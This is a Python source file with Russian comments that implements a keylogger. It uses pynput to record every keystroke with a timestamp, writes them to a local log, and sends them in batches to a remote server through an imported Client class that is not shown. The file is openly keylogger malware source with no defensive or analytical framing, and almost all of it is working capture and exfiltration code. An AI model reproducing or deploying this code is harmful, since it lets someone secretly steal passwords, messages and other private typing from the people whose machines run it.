import socket as sock
import os
import logging
import datetime

from typing import List
from pynput.keyboard import Key, Listener

from client import Client


class Keylogger: 
    def __init__(self, client: Client, keys_limit: int = 10) -> None: 
        self._client: Client = client
        self._MAX_LIMIT: int = keys_limit  # лимит нажатий перед отправкой

        # настройки логгера
        path_to_log: str = "D:\\Coding\\PYTHON\\big_projects\\keylogger\\keylogger\\keylogger_logs.log"
        logging.basicConfig(level=logging.INFO, filename=path_to_log, filemode='w')


    def run(self) -> None: 
        while 1:
            try:
                self.listen_keys()  # прослушивание нажатий
            except Exception as err:
                logging.critical(f"error: {err}")

        self._client.close()


    def listen_keys(self) -> list[str]:
        keys: List[str] = []  # список нажатий 

        count: int = 0  # кол-во нажатийы

        def on_press(key) -> None: 
            k: str = str(key).replace("'", "")
            cur_date: str = datetime.date.today().isoformat()  # текущая дата
            cur_time: str = datetime.datetime.now().time().isoformat()[:-7]  # текущее время

            mes: str = f'[{cur_date}] {cur_time} - key: \"{k}\"\n'  # лог о нажатии, идущий на сервер
            keys.append(mes)  
            logging.info(f'[+] [{cur_date}] {cur_time} - key: \"{k}\"\n')

            nonlocal count
            count += 1

            # если число нажатий равно максимальному лимиту
            if count == self._MAX_LIMIT:
                self._client.send(keys)  # отправка всего списка с логами на сервер 
                keys.clear()  # очистка списка
                count = 0  # обнуление кол-ва нажатий

        def on_release(key) -> None:
            if key == Key.esc:  # клавиша выхода
                return False

        # прослушивание нажатий
        try:
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
        except Exception as err:
            logging.critical(f'Keyboard listening failed: {err}')


def main() -> None: 
    keylogger: Keylogger = Keylogger(Client())
    keylogger.run()


if __name__ == '__main__':
    main()